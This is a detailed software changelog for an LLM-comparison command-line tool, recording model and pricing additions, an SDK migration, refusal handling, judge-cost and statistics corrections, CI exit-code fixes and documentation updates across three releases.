# Changelog

All notable changes to Cli Modelarium will be documented in this file.

## [0.1.9] - 2026-09-02

### Added

- **Claude Fable 5.1 joins the registry** as `claude-fable-5-1`, at $10.00 input / $50.00 output per 1M tokens with a $0.25 cache-read rate, taking the registry from 93 models to 94. It rejects sampling parameters - `temperature`, `top_p` and `top_k` each return a 400 reading "deprecated for this model" - so the tool omits the field and the flagged set goes from sixteen to seventeen. Used as a judge it therefore joins the degraded-judge set and prints the non-reproducibility notice, exactly as `claude-opus-5` and `claude-sonnet-5` do. Thinking tokens are counted inside `output_tokens`, so the output rate covers them and the reported cost is complete.

  **The $0.25 cache rate is 2.5% of input, where every other Claude row is 10%, and it is not a typo.** Anthropic's pricing page footnotes cache hits on Fable 5.1 and Mythos 5.1 at 0.025x base input and every other model at 0.1x. It is pinned by a test, because an editor "correcting" it to $1.00 would quadruple every reported cache saving in silence.

  It is in **no static group**: `all-flagship` / `all-premium` carry one model per provider and `claude-opus-5` holds the Anthropic slot, so promoting Fable would double the input and output price of every `all-flagship` run. It **is** included in `--models all`, on the same basis as every provider except OpenRouter and NVIDIA - its prices are real and it adds no duplicate-weight row. At $10/$50 that is the most expensive row `all` can select, and `--max-cost` is the existing lever if that matters to you.

  The nine READMEs gain a line in the privacy note: Claude Fable 5.1 requires 30-day retention and is not available under zero-data-retention. It is the only registry row with such a condition, and the line is phrased as a property of that model rather than a contrast - this tool has not verified the retention posture of the other 93.

### Changed

- **The Anthropic SDK moves to 1.x; `temperature` now travels via `extra_body`.** The pin was `anthropic>=0.104,<0.200`, which cannot install any 1.x release. 1.x removed `temperature`, `top_p` and `top_k` from its typed signatures, so passing one raises `TypeError` before any HTTP call - which broke five of the ten registered Claude models (`claude-haiku-4-5`, `claude-sonnet-4-6`, `claude-sonnet-4-5`, `claude-opus-4-6`, `claude-opus-4-5`); the other five never receive a temperature and were unaffected. The provider now sends it through `extra_body`, which is merged into the request JSON as-is and which those models still honour. The pin floors at 1.3, not 1.0: 1.3.0 is what this provider was exercised against, and 1.0.0-1.2.0 have been run by nobody here. Nothing else in `pyproject.toml` moves - `httpx~=0.28` stays, because `httpx2` is a separate distribution and the two resolve side by side; the full resolve adds `httpx2`, `httpcore2` and `truststore` and removes or downgrades nothing.

  **Temperature validation is unchanged, in both directions.** The 0..1 range was never enforced client-side - the typed parameter was an annotation, not a constraint, and 0.125.0 sent `temperature=2.0` and even `temperature="hot"` to the server without complaint. `--temperatures 0,0.7,2` failed as a round-trip 400 before this change and still does. No client-side range check was added: doing so would change behaviour this release otherwise leaves alone.

- **The CSV layout gained two columns, `stop_reason` and `stop_category`, appended after `assertions_failed_types`.** A pipeline reading CSV by column position will need updating; one reading by header name is unaffected. They are empty for every non-refused row.

### Fixed

- **Refusals from Claude models are now reported as refused rather than counted as empty successes, with their cost and a new `stop_reason` field.** A declined request arrives on HTTP 200 with real cost and no answer, and the provider only ever read the usage block - so it recorded an ordinary success with an empty output. Four of the ten assertion types pass against an empty string (`not_contains`, `max_length_chars`, `latency_under`, `cost_under`), which meant a CI gate built from cost, latency and a length cap reported a 100% pass rate on a request the model declined and you were billed for. That gate now exits 1: a refused cell marks every configured assertion as errored, which leaves `pass_rate` undefined and routes to the existing "nothing was verified" path rather than needing a new exit code. Detection is by `stop_reason`, never by an empty content array - `claude-opus-5` refuses with a thinking block and non-zero output tokens while `claude-fable-5` refuses with nothing, so an emptiness check would miss the first. `refused` is carried beside `error`, never folded into it: `error` still means the call failed and cost nothing, so a refusal keeps its cost in every total and does not turn a 200 into a call failure. Output-derived statistics now exclude refusals; timing and cost do not. That matters most under `--runs`, where five refusals used to give one unique output, `output_diversity` 0.2 and a stable mode of `""` - low diversity and a steady mode read as a highly deterministic model, when it had refused five times. `stop_category` is stored and rendered as an opaque string and never branched on, because the provider's category set is open.

- **Provider request parameters are now checked against the real SDK signature.** Every provider's test double accepts `**kwargs`, so a keyword the real typed method rejects passes in tests and raises `TypeError` on every live call. A new suite drives each provider's real code path through a recorder and asserts the kwargs it built are a subset of the parameters the installed SDK declares, for all four SDK families; Google's nested `config=` keys are checked the same way. It needs no network and no API key.

## [0.1.8] - 2026-08-31

### Added

- **Moonshot AI (Kimi) as a twelfth cloud provider, with four models. It is registered from Moonshot's published documentation and has NOT been exercised against the live API** - Moonshot requires a $1 minimum top-up before any request and no key was purchased, so every figure below was read rather than measured. That is a weaker basis than every other provider here carries, and it is stated first because a cost figure you cannot check is worth less than one you can. `MoonshotProvider` is a thin `OpenAIProvider` subclass at `https://api.moonshot.ai/v1`, in the shape of `DeepSeekProvider` and `ZAIProvider`; streaming, TTFT, `stream_options` usage, error translation, redaction and retry are all inherited unchanged. Set `MOONSHOT_API_KEY` or run `cli-modelarium keys set moonshot`.

  Four models, per 1M tokens as input / output: `kimi-k3` 3.00 / 15.00 at 1,048,576 context; `kimi-k2.7-code` 0.95 / 4.00; `kimi-k2.7-code-highspeed` 1.90 / 8.00; `kimi-k2.6` 0.95 / 4.00, the last three at 262,144. The highspeed row is exactly double its base on both columns - that is Moonshot's published relationship, the same model on a faster serving route, not a copied row - and `kimi-k2.6` shares `kimi-k2.7-code`'s input and output while differing only in a cache rate that is not registered. Both are pinned by tests, because each reads as a typo otherwise. `kimi-k2.5`, the `moonshot-v1` family and the `kimi-k2` previews are NOT registered: the first two sunset today and the third was discontinued 2026-05-25. Nothing was added to `RETIRED_MODELS` - that structure is for ids this registry once served, and none of these ever were, so `Unknown model: kimi-k2.5` is already accurate.

  **No cached-input rate is registered for any of the four, and Moonshot does publish one.** Its chat API documents `usage` as four flat fields - `prompt_tokens`, `completion_tokens`, `total_tokens`, `cached_tokens` - with no `prompt_tokens_details`, and `OpenAIProvider.complete()` reads `cached_tokens` only from inside `prompt_tokens_details`. Against the documented shape a registered rate could never fire, so it would be four dead constants. **The consequence: cached tokens bill at the full input rate, so a Kimi cost is over-reported against a real cache hit** - the safe direction, and identical to how the Mistral, Groq and OpenRouter rows already behave. 32 of the 89 pre-existing entries were already in this state. `tests/test_moonshot_provider.py` pins what the client extracts from each candidate shape, so if a live call ever shows the nested one the rates can be added and the test says they will then fire.

  **One thing no amount of reading can settle: whether `completion_tokens` includes reasoning tokens.** The documented usage block shows no separate field and thinking is always on for these models, which points to inclusion. If it does not, every Kimi cost is understated by whatever fraction of generation was reasoning - the defect this project already hit on Gemini, where thought tokens outnumbered visible output about 19 to 1 on a short prompt. Recorded in `moonshot_provider.py` so the next person does not re-derive it.

  All four fix `temperature` (and `top_p`, `n`, `presence_penalty`, `frequency_penalty`), so the tool omits the field and the flagged set goes from twelve to sixteen. **Those four flags came from the parameter reference, not from a measured 400**, which is a different standard from the other twelve; `tests/test_temperature_predicate.py` now records that distinction rather than silently absorbing it. A Kimi model used as a judge therefore joins the degraded-judge set and prints the non-reproducibility notice.

  **The 429 quota subtype is not yet distinguished.** `exceeded_current_quota_error` means an empty balance and should not retry, but Moonshot's documented error body is nested, so the SDK leaves `err.type` as `None` and the subtype is reachable only through `e.body` or a substring of the message - which would mean changing `_reraise`, shared by nine of the twelve providers, to match a shape nobody has observed at runtime. Deferred. The cost is bounded and small: an empty balance costs four attempts and about seven seconds per cell before a clear error naming the quota.

  Moonshot is included in `--models all`, on the same basis every provider except OpenRouter and NVIDIA is: its prices are real, it adds no duplicate-weight rows, and its models are rate-limited rather than unreachable. **One second-order effect worth knowing**: the live per-model streaming display auto-collapses above twelve concurrent tasks, and ten one- and two-provider key combinations currently sit at nine to twelve. Adding a Moonshot key pushes those over, so those users see the one-line "many concurrent tasks" notice instead of the panels. Cosmetic, and `--show-all-runs` forces the panels back.

  Moonshot requires a $1 minimum top-up before any use - there is no free tier, unlike every other provider here - and Tier0 is 1 concurrent request, 3 requests per minute and 1.5M tokens per day, with $10 cumulative top-up moving you to Tier1. The concurrency default is unchanged at 5: it is one value applied to every provider, and a fixed default cannot be right for both Tier0's 1 and Tier1's 50. The nine READMEs document the tier beside the existing DashScope note, and the bullet claiming per-provider limits "respect all tier baselines" - false the moment this provider landed - is corrected in all nine.

- **A sentence in the nine READMEs' privacy note saying that data retention and training terms differ between providers, that this tool makes no claim about any of them, and that you should check the terms of each provider you configure.** It names no provider deliberately: naming one would imply the other eleven do not train on customer content, which this project has never claimed and has not verified across eleven independently-changing sets of terms. `SECURITY.md` already carries a provider-agnostic version; this puts it where users actually read, and in the eight translations.

### Changed

- **Your reported judge cost will drop, by up to 95% on a `--runs 20` comparison. No spend changed and no data was lost - the old figure counted one judge call N times.** With `--runs N` and no `--check-hallucination`, judging makes ONE call per `(model, temperature, system_prompt)` cell and gives that single verdict to every run in the cell. It gave them the same object, and five separate places sum `judges[].cost_usd` over every row: the two console summaries, the JSON formatter, the markdown formatter, and `total_judge_cost`. None of them could see that twenty rows shared one call, so all five multiplied it by twenty. The call count did the same thing - `40 judge calls` for the 2 that were made. A comparison that reported `$0.004000 (40 judge calls)` yesterday reports `$0.000200 (2 judge calls)` today, and the second figure is the one that matches the bill. Per-run judging - `--check-hallucination`, or `--runs 1` - was never affected: every run there has its own verdict, and its cost and call count are unchanged.

  **Fixed at the expansion, not at the five sites.** The first run of each cell keeps the verdict that was paid for and the rest get zero-cost copies, so every site agrees without any of them changing, and each row still shows the score and reasoning it inherited. The call count skips the copies via a marker set where the copy is made; it is **not** derived from a non-zero cost, because 17 registry rows are legitimately free and a free judge's calls must still count.

  **This does not change what you are charged, and it does not change `--max-cost` or a `cost_under` assertion** - neither reads the judge total. What changes is the number reported to you afterwards, on every surface that reports it.

- **`--runs N` with `--judge` compared the right number of observations, for the wrong reason, and was one commit away from stopping.** The score sample the significance test consumes was keyed on object identity, and came out at one observation per cell only because every run in a cell pointed at the same verdict object. De-aliasing those objects - which the cost fix above requires - would have silently turned `n=3` into `n=15`: fifteen "independent" observations of three judgements, and a p-value that fell by nine orders of magnitude with no warning. The verdicts now record explicitly that they are shared across a cell, and the sample is one observation per judged unit either way. Landed before the cost fix, and the samples are byte-identical across it.

- **Paired significance tests over more than one temperature or system prompt used a third of the data.** `--significance-test paired-t` and `wilcoxon-signed` matched observations on `run_index` alone. Run 0 exists in every cell, so three temperatures collided into one entry and the later cells overwrote the earlier ones: a 3-temperature x 5-run comparison paired 5 observations and reported `n=5`, or `insufficient_samples` where it had enough data for a verdict. Observations are now keyed on the whole cell plus the run.

- **A model that produced nothing was reported at `avg 0.000`.** 0.0 is a real mean a model can score, so it could not also mean "no data" - and it appeared on the one line whose job is to compare two models, rendering a total failure as the worst possible result rather than as an absent one. `mean_a` and `mean_b` are now `null` on an empty sample; the console prints `no data` and the markdown table a dash. The arithmetic is untouched: an empty sample already routed to `insufficient_samples` with `p=null`.

- **Four displays reported less than the run had measured.** The degraded-judge notice - the judge rejected a temperature setting, so its scores are not reproducible - existed only in the single-run display, and not under `--runs N`, the flag reached for to measure reproducibility. A judge can classify hallucination risk and return no parsable score; `hallucination_risk` in the JSON needs only the classification, so the JSON said `High` where the console and the markdown table both said `N/A`. The temperature caveat that qualifies a significance verdict reached the console and the JSON but not the markdown, which is the format written to a file and passed on. And a panel average rendered `7.0 (1)` when one judge of three parsed, which is exactly how a single-judge panel renders; it now reads `7.0 (1 of 3)` on the console, with the CSV column unchanged.

### Fixed

- **A CI gate could pass on a batch where nothing was evaluated.** Errored assertions are excluded from both the numerator and the denominator of the pass rate - deliberately, so a missing optional dependency does not turn a build red. When they were the ONLY thing that happened the denominator was empty, and `total_passed / total_definitive if total_definitive else 1.0` substituted the ideal value: `0/0 (100.0% pass rate)`, exit 0, **even under `--min-pass-rate 1.0` and `--strict-assertions`**. `pass_rate` is the field a gate reads, and the sentinel pointed at pass.

  **`pass_rate` is now `null` rather than `1.0` on that path**, in JSON and in the rendered summaries. Omitting the key was rejected: `payload.get("pass_rate", 1.0)` would have reproduced the exact bug inside the consumer, and absence would be indistinguishable from a version that never emitted it - the reasoning already recorded at `output_formatters.py:355-362` for `models_without_temperature`. Keeping `1.0` beside a new boolean was rejected for the same reason: anyone not reading the flag still reads `1.0`. `null` raises at the one moment the value is meaningless.

  **Two different situations reach the empty denominator and they are now told apart**, because the remedy differs. A suite whose assertions all errored is broken and exits 1 whether or not a gate flag was passed. A suite with no assertions at all is not broken; it exits 0 as before, and exits 1 only when `--min-pass-rate` or `--strict-assertions` explicitly asked for a gate that cannot be satisfied. Both print what happened. `AssertionTotals.configured` is the discriminator; guarding on the empty denominator alone would have given a suite with no assertions the broken-suite treatment.

  **The optional-dependency guarantee is unchanged in the case it was written for.** A `json_schema` assertion that cannot run alongside assertions that can still contributes nothing to the verdict and still exits 0. Only the degenerate run - where nothing at all produced a verdict - changes, and `tests/test_cli_assertions.py` now pins both halves.

  `total_assertions_errored` is added to the JSON, always present whenever the assertion block fires and `0` on the normal path, for the same reason `pass_rate` is `null` rather than absent. The console summary guard at `cli.py:1192` was `definitive > 0 or failed > 0`, false on exactly this path, so the one line a reader scans said nothing about assertions on the run where it mattered most; it now reports the errored count. Nothing else moves: no statistic, p-value, confidence interval or cost figure is touched.

- **Three ways a `batch` gate passed with zero assertions evaluated.**

  **Forgetting the `batch` verb ran the filename as a prompt.** `_DefaultCommandGroup.resolve_command` catches any `UsageError` and rewrites the first bare token into a `compare` prompt, which is the documented shorthand - but it never checked whether that token was a file. `cli-modelarium eval_suite.json --models X` therefore billed a real call, sent the path to the model as the prompt, never parsed the suite, and exited 0; the same line with `batch` exits 1. Every shared flag kept it silent, and only a batch-only flag surfaced it. An existing file as the first bare token is now a `UsageError` naming both the likely fix and the escape hatch, raised before any provider is constructed - so the change removes a billed request rather than substituting a different one. There is deliberately **no extension check**: `batch` accepts only `.txt` and `.json`, so gating on the extension would narrow this to exactly the cases `batch` would have accepted anyway and leave a suite saved as `.yaml` still running silently as a prompt. The bare-prompt shorthand is unaffected - 89 test invocations and all 31 documented examples rely on it, and none names a file.

  **An empty suite exited 0.** `batch` returned early on a file that parsed to no prompts, so nothing ran, no output file was written, and any `--min-pass-rate` went unapplied - and under the README's own JSON recipe stdout was 0 bytes, making a truncated suite indistinguishable from a green run. It now exits 2: there is no assertion verdict to report, and the run could not proceed, which is what the other pre-flight failures use.

  **`--no-assertions` silently disarmed the gate beside it.** The CLI already rejects `--strict-assertions` with `--min-pass-rate` as ambiguous, but accepted either alongside `--no-assertions`, which skips every assertion - so failing assertions exited 0 with nothing printed to say the gate had been switched off. It now raises the same `UsageError`, before any call.

- **Four pieces of documentation asserted behaviour the code does not have.**

  **The exit-code table said code `1` was `batch`-only.** It is at `README.md:362` and at line 245 in each of the eight translations. `compare` does return `1` - verified as real subprocesses on an unwritable `--output` path and on `--concurrency -1`, both as uncaught tracebacks, and the first of those is listed in the same table as a cause of code `2`. The row now says only `batch` produces an assertion *verdict* while `compare` can still exit `1` on an unexpected error, and it names the new "verified nothing" cause from this release. All nine files were edited: the parity suite's heading test matches `^#{1,3}` and `#### Exit codes` is level 4, so an edit in one language and not the others would have passed.

  **The `test_used` enum was documented as five values while emitting seven.** `paired_t_test` and `wilcoxon_signed_rank` have been emitted since they were added and the comment at `run_statistics.py:195` never learned about them. It is the only place the set is written down.

  **The `_emit_batch_results` docstring claimed four run-level fields "flow to ALL formatters (not just JSON)".** CSV receives one of the four; `_format_csv` has no parameter for the other three, so a significance verdict written to CSV is computed and discarded. The docstring now says what each formatter actually receives. Whether CSV *should* carry run-level fields is left open.

  **`batch --include-reasoning` was a documented no-op.** The parameter appeared once, in the signature, and was never read, while `--help` advertised it. It is now rejected with a message that names where the reasoning already is and which command the flag works on. Not wired: that would put judge reasoning into markdown and CSV and falsify the privacy note in nine READMEs, which says those two do not carry it. Not silently removed: a documented flag collapsing into "no such option" is the worse message.

## [0.1.7] - 2026-08-25

### Added

- **Five models: `glm-5.3`, `grok-4.6`, `gemini-3.7-flash`, `qwen3.8-max` and `qwen3.7-flash`.** First-party verified 2026-08-20, out of band with `PRICING_AS_OF`, which stays at 2026-07-29 - the precedent set for the gpt-5.6 line at `pricing.py:52`. No group gained a member; every existing entry is byte-identical, prices included.

  Three of the five carry a tier or schedule that a single rate cannot express, so each says so beside itself rather than in a note nobody reads. `grok-4.6`'s rate is the sub-200k tier, and past 200k **every** token in the request bills at the higher tier, not just the excess. `qwen3.7-flash`'s is the entry input tier to 32k, rising to 0.10/0.40 above that and 0.20/0.80 above 256k. `gemini-3.7-flash` is on a published schedule that doubles it to 1.50/7.50 on 2027-01-01; that comment records what Google's page said and when it was read, not a rate predicted to start on a date - `545640c` had to undo the opposite shape. Both Qwen figures are the Singapore column, the region `dashscope-intl.aliyuncs.com` serves.

  **One number is recorded as unsettled rather than asserted.** Every DashScope row already in the registry prices cached input at exactly 20% of input, and the block declares `cached_input = Implicit-Cache read rate where offered`. The two new Qwen rows come in at 8.5% and 10%. That is what the 2026-08-20 pass recorded, and the comment beside them says plainly that whether Alibaba changed the cache rate class for these models or the older rows use a different one is not established.

- **The Z.AI block comment no longer states an entry count.** It read "its 14 entries have not changed since the date above" - true when written, false the moment `glm-5.3` landed, and guarded by nothing: no test reads `pricing.py` as text. It now says every entry checked on 2026-06-22 is unchanged and points at the per-entry dates for anything newer. `CHANGELOG.md:143` makes the same claim and is left as shipped history.

- **The nine READMEs stop enumerating which providers carry their own verification date.** The sentence said "noted beside each one in the registry" and then grouped by provider anyway, which needed an edit every time one model in a block was refreshed - and broke outright once Z.AI carried two dates. It now states the rule and names only the oldest date, so the next out-of-band verification needs no README change at all.

### Changed

- **Test key fixtures now say `NOT_A_REAL_KEY` in the body.** Prefix and length are unchanged, so every pattern and redaction rule is exercised as before. Secret scanners match on prefix plus length plus a body that looks random; the bodies no longer do. Do not make them look realistic again.

- **The judge is now asked to write its reasoning before its score, so every judge score in a judged run may move - and with it every significance verdict.** `README.md:184-185` states the rule: "The default metric is the judge `score` when judging is on, otherwise `latency_ms`." So this is not a display change. Every p-value, Cohen's d, bootstrap confidence interval and Bonferroni/Holm correction in a judged run is computed over judge scores, and a user who had "significantly better, p=0.03" against 0.1.6 may not have it after upgrading. The same flip is applied to the hallucination preset, ordered reasoning, score, risk_level.

  **This is a hypothesis, not a measured result, and it is stated as one.** The mechanism - a model that emits the score first has committed to a verdict before writing the justification for it - is true by construction only for a model that emits its answer directly. It does not hold for one that reasons in a hidden trace before emitting anything, and the twelve models flagged `rejects_sampling_params` are both the likeliest judges in a panel and the likeliest to work that way. No percentage is claimed because none was measured; measuring it needs paired live runs against both templates, which this release does not contain.

  **It does not confound with the four cost corrections in this same release.** The significance metric is one of `score`, `latency_ms`, `output_tokens` or `cost_usd`, so a default-metric verdict moves only because of this change and a `--significance-metric cost_usd` verdict only because of the pricing work. The two land in disjoint columns and can be attributed separately.

  For the hallucination preset, `risk_level_from_score` maps 1-3 to High, 4-6 to Medium and 7-10 to Low, so a score moving 6 to 7 flips the reported category outright rather than nudging it. `hallucination.py` derives `risk_level` on the field's **absence** rather than its position, so the reorder itself is parse-safe; only a moved score changes a bucket.

  The reasoning field stays "one sentence". Lengthening it is a separate change and is not made here.

- **`all-flagship` (and its alias `all-premium`) moved four of its eight slots to each provider's current top model, and the group now costs 2.2% more to run.** `gpt-5.5` → `gpt-5.6-sol`, `claude-opus-4-8` → `claude-opus-5`, `grok-4.3` → `grok-4.6`, `qwen3.7-max` → `qwen3.8-max`. Google, DeepSeek, Mistral and Z.AI keep their slots. The provider set is unchanged - openai, anthropic, google, xai, deepseek, mistral, dashscope, zai - so nobody needs a key they did not need before.

  The estimate a run of the whole group produces goes from $0.050928 to $0.052053. Two of the four swaps are cost-neutral, `qwen3.8-max` is 20% cheaper than the model it replaces, and the rise is almost entirely `grok-4.6`, which is 113% dearer than `grok-4.3`. **A `--max-cost` ceiling tuned within 2.2% of the old figure will now trip.** It trips before anything is spent - the pre-flight compares the estimate and exits 2 without making a call - but the message names the estimate and the ceiling, not the fact that the group's membership changed, so a ceiling that starts failing after this upgrade is why.

  **`glm-5.3` is registered but deliberately not promoted.** It was added in this release, and Z.AI's slot still holds `glm-5.2`. No published Artificial Analysis score exists for it, and a benchmark writeup found it scored exactly the same as `glm-5.2` - unmeasured is not a reason to swap, and a group whose membership moves on unmeasured claims is worse than one that stays put.

  Mistral keeps `mistral-large-latest` despite scoring far below every other member. The group means each provider's top model, not a quality bar: a low score sitting next to a high one is information a comparison tool exists to show.

- **`all-premium` is now the same list object as `all-flagship` rather than a second copy of it.** They were two independent eight-element literals with identical contents and nothing in `src/` linking them, so every membership edit had to be made twice and nothing caught a miss. Both names still work and both resolve to the same eight ids; no user-visible behaviour changes. `all-flagship` is the canonical name because the group means each provider's top model rather than a price tier - `deepseek-v4-pro` is DeepSeek's flagship at 0.435 input, which nobody would call premium. The value must be the list, never the string `"all-flagship"`: `expand_group` does `list(MODEL_GROUPS.get(group, []))`, and `list()` on a string iterates characters, so an alias by string expands to twelve one-character model ids and fails with `Unknown model: a`. The comments at `models_registry.py:75-78` and `test_models_registry.py:198` record the trap.

- **`configure` stopped asking for eleven credentials on a machine with no keychain, and its panel now reports what actually happened.** With no backend available, every `save_key` raised, the loop caught it per provider and carried on, and the user typed eleven real API keys into nothing before a green "Configuration complete" panel and exit 0. `NoKeyringError` now stops the loop after reporting the reason once - a backend cannot appear between two prompts, so every remaining provider would fail identically. `KeyringError` deliberately does **not** stop it: that class covers `KeyringLocked`, `InitError` and `PasswordSetError`, and `PasswordSetError` is what KWallet raises when someone dismisses a single OS auth dialog (`kwallet.py:141`) - abandoning ten providers because a user pressed Escape once would be worse than the bug being fixed. The bare `except Exception` stays, and is load-bearing: Windows calls `win32cred.CredWrite` unwrapped, so a write failure there arrives as a `pywintypes.error` that is not a `KeyringError` at all.

- **The summary distinguishes five outcomes where it previously counted one.** `saved` was the only counter, so "1 of 11 providers configured" was byte-identical whether the other ten were skipped or rejected. Runs are now tallied as configured / skipped / invalid / not stored / not reached, and `attempted` is derived from the first three rather than counted separately so it cannot drift. Format failures and storage failures stay apart in the prose as well as the counts - a user with a locked keychain told their key was "invalid" goes and inspects a key that was never wrong. `not reached` exists because stopping early leaves providers in none of the other four buckets; a summary that omitted them would have been a new version of the same defect. The panel's colour and title follow the outcome (green / yellow / red / neutral), an interrupt gets its own "Setup cancelled" rather than rendering as success, and every line is checked against the counters it sits beside.

- **Exit code reflects the outcome.** The only non-zero condition is `attempted > 0 and configured == 0`, using the existing `EXIT_CALL_FAILED`; there is no fourth code. Partial success stays 0 - configuring the two providers you own is success, not a shortfall against the nine you do not - and so does a run where everything was skipped, which is why the guard is not `configured == 0`. An interrupt keeps exit 2 and now prints the summary, so a run cancelled after three saves says which three.

- **The `ValueError` arm of `configure` now redacts.** `cli.py`'s "Invalid format" line interpolated the exception directly; patching `save_key` to raise a `ValueError` carrying a canary put the canary verbatim on screen. It was safe only because `security.py` builds that message without the key, and nothing enforced that. `keys set` needed no change - `_print_error` already calls `redact_secrets`.

- **`configure` has tests for the first time**, which is how all of the above survived. Thirty-seven of them, including a keyring double that can raise, parametrised over every exception class reachable from a save path; the partition invariant `configured + skipped + invalid + not_stored + not_reached == len(providers)` asserted across twelve scenarios; and panel colour asserted through SGR codes. Uncertain and noted rather than assumed: no environment available to this work could exercise a real locked macOS Keychain or Secret Service, so which class a locked-but-present keychain raises per platform is read from keyring's source rather than measured. If it raises `NoKeyringError` on some platform, that platform would stop the loop where continuing would have been better.

### Fixed

- **Every judge has been shown a malformed JSON example labelled "this exact format", and a judge that copied it had its score thrown away.** `JUDGE_PROMPT_TEMPLATE` carried `{{` / `}}` escaping for `str.format`, but `build_judge_prompt` substitutes with `str.replace` and nothing anywhere unescapes the doubled braces. `.format()` is never called in `src/` at all - it survives only in two comments, one of which was the comment justifying the escaping. Rendered against the real module rather than read from the source, the prompt ended:

  ```
  Respond with ONLY a JSON object in this exact format:
  {{"score": <1-10 integer>, "reasoning": "<one sentence explanation>"}}
  ```

  A reply copying that example is discarded: `parse_judge_response` returns `score=None` with `could not extract JSON object`, because the balanced-brace fallback hands `json.loads` the whole `{{...}}` string. Single braces parse and score normally, and a fenced ```` ```json ```` block containing doubled braces fails identically - the fence stripper does not rescue it. So every score this tool has ever produced came from a judge that ignored its own instructions, and any judge that followed them was silently dropped.

  **The defect was invisible to reading and to the suite.** No parse-error rate is tracked, no test captured a real failure, and applying the fix to a scratch copy changed nothing: 1493 passed before, 1493 after. `TestBuildJudgePrompt` asserted criteria bulleting, substitution and injection-safety, but never the response-format example; `test_hallucination.py` pinned the instruction line and `risk_level`, but neither braces nor key order. Three tests now assert on the **rendered** prompt for both templates, which is where the defect lived - one pins that no escaped brace survives rendering, and two round-trip the example back through `json.loads` to pin that it parses and that `reasoning` comes first. They are anchored on the instruction line rather than "the first line starting with `{`", because the response is substituted above the example and a positional selector picks the wrong line once a response carries JSON of its own.

  The hallucination template already used single braces and needed only the key reorder - but its example is split across two adjacent string literals, the first owning the opening brace and the second the closing one, so swapping the lines yields `}` before `{`. Both literals were rewritten, and the comment above them now says so.

- **`gemini-3.6-flash` was priced 100% high: the registry carried its 2027 rate as if it were current. Reported costs for that model now read HALF what they did.** Google's published schedule shows 0.75 / 3.75 / 0.075 through 2026-12-31 and 1.50 / 7.50 / 0.15 from 2027-01-01; the registry held the second set. A 1M-in / 1M-out run drops from $9.00 to $4.50, and every figure the tool printed for that model - the cost column, JSON, CSV, Markdown, the `pricing` command, `--max-cost` estimates and `cost_under` assertions - was twice what Google charges today. No other model's price moved; the other six Google rows were checked against the same reading and all match.

  **Two Gemini corrections land in this release and they pull in opposite directions - they are not the same fix.** Counting thought tokens raised Gemini costs, because the tool had been reporting fewer tokens than were billed. This lowers `gemini-3.6-flash` specifically, because the rate itself was the 2027 one. A user comparing 0.1.6 output to 0.1.7 will see that model's cost move for both reasons at once.

  This is the mirror of the `claude-sonnet-5` correction below. There the registry encoded an increase that was later cancelled; here it encoded one that had not yet taken effect. Both come from writing a future price into a field that means "current", so the comment now records what the source said and when it was read rather than what it will say - the form that survives either outcome. `gemini-3.7-flash`, registered in the same release, already carried the current figures; the two rows are identically priced on Google's page and now agree in the registry.

- **`claude-sonnet-5` was priced 50% high, and had been since 0.1.6.** The registry carried Anthropic's list price of 3.00 / 15.00 (cached 0.30) on the strength of a comment predicting that introductory pricing of 2.00 / 10.00 would end on 2026-08-31 and list pricing would take effect 2026-09-01. Anthropic has since stated the introductory rate is permanent and the increase cancelled, so the entry is now 2.00 / 10.00 (cached 0.20) - verified 2026-08-20, out of band with `PRICING_AS_OF`, following the precedent already set for the gpt-5.6 line. Every Sonnet 5 figure the tool printed - the cost column, JSON, CSV, Markdown, the `pricing` command, `--max-cost` estimates and `cost_under` assertions - was one and a half times what Anthropic charges. No other model's price moved, and `PRICING_AS_OF` is unchanged. The comment above the entry now records what Anthropic says and when that was read, rather than predicting a date: a prediction is what went wrong here, and a registry entry cannot be right about the future.

  The prediction also appears in the released 0.1.5 entry below, at "`claude-opus-5` … and `claude-sonnet-5` (3.00 / 15.00 / 0.30)". That entry is left as shipped; this one corrects it.

  One consequence worth knowing before it surprises you: `claude-sonnet-5`, `claude-sonnet-4-6` and `claude-sonnet-4-5` previously shared a byte-identical rate triple, so a `--significance-metric cost_usd` comparison between any two of them had zero variance and equal means, and `run_statistics` reported `test_used="trivial"` with `p_value=1.0`. With Sonnet 5 cheaper the means now differ, the same comparison takes the `zero_variance` branch, and **the p-value disappears rather than changing**. That is correct - there is no variance to compute one from - but a vanished number reads like a regression, so it is called out here rather than left to be discovered.

- **Gemini costs were understated because thinking tokens were not counted. Reported Gemini costs will now read HIGHER - Google has not raised prices; the tool was reporting less than you were billed.** `google_provider.py` read `prompt_token_count`, `candidates_token_count` and `cached_content_token_count`, and ignored `thoughts_token_count` on the same object. Google prices reasoning at the output rate - its pricing page labels that rate "Output price (including thinking tokens)" - so every Gemini model that thinks reported a cost lower than the user was charged. Measured against the live API on 2026-08-20: `gemini-3.6-flash` answering `"hi"` returned 9 output tokens and **170** thought tokens, so the reported cost was about **a twentieth** of the billed one; a longer reasoning prompt returned 206 output against 547 thought, about a third. Google thinks by default with no opt-in, so this was live for every user of such a model rather than dormant behind a flag. `gemini-3.1-flash-lite` measured zero thought tokens on the same prompts and is unchanged.

  Thinking is now added to the output count rather than carried separately, which also makes Gemini consistent with the rest of the registry: OpenAI, Anthropic and Qwen all fold reasoning into their own output figure, and Google is the only one that reports it apart. `total_token_count` is used as a cross-check - anything the three known fields do not account for is folded into output rather than dropped, since understating a cost is the failure being fixed.

  **Uncertain, and stated rather than implied:** two of the six registered Gemini models were measured. Which of the other four think, and by how much each was understated, is not established.

  The test double is fixed as part of this, because it is why the bug survived. It built exactly the three fields the client read, so it could never surface the one the client missed; it now carries every field the SDK exposes on `GenerateContentResponseUsageMetadata`. The new tests deliberately omit `total_token_count` where they assert on thinking - with a coherent total present, the cross-check reconstructs the same number from the remainder and the test passes even when the thoughts field is ignored, which is the same can't-fail shape in a new place.

- **The nine READMEs claimed one exception to the pricing verification date; there were three, and this release makes four.** "The Z.AI/GLM prices are the one exception" had been wrong for some time: `pricing.py` also records gpt-5.6 verified 2026-08-07 by live call (`:51-54`) and the NVIDIA NIM rows verified 2026-08-15 (`:317-320`), and the Sonnet 5 correction above adds a fourth at 2026-08-20. Nothing tested the claim - the parity suite pins the *set of dates* each file states, not the word "one" - so it went stale silently in nine languages. The sentence now names the entries that carry their own date rather than counting them, which is the difference between a sentence that needs editing every time a price is verified out of band and one that needs editing only when the set changes. Prose in all nine, no new bolded date, bullet counts unchanged.

